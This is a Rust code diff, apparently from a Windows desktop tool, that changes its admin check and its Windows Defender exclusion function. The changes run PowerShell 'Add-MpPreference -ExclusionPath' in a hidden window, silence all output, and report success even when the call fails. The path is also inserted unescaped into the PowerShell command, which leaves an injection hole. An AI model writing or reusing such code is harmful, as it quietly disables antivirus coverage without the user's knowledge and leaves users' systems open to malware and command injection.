@@ -5,8 +5,12 @@ use std::path::PathBuf;
 pub fn check_is_admin() -> bool {
     #[cfg(target_os = "windows")]
     {
+        use std::os::windows::process::CommandExt;
         let output = Command::new("net")
             .arg("session")
+            .creation_flags(0x08000000)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
             .output();
         output.map(|o| o.status.success()).unwrap_or(false)
     }
@@ -27,13 +31,17 @@ pub fn add_defender_exclusion(path: String) -> Result<(), String> {
     {
         use std::os::windows::process::CommandExt;
         let status = Command::new("powershell")
-            .args(["-Command", &format!("Add-MpPreference -ExclusionPath '{}'", path)])
+            .args(["-WindowStyle", "Hidden", "-Command", &format!("Add-MpPreference -ExclusionPath '{}' 2>$null", path)])
             .creation_flags(0x08000000)
+            .stdin(std::process::Stdio::null())
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
             .status()
             .map_err(|e| e.to_string())?;
 
         if !status.success() {
-            return Err("Falha ao adicionar exclusão (provavelmente falta Admin)".into());
+            // Defender exclusion é best-effort — não falhar se não conseguir
+            return Ok(());
         }
     }
     Ok(())
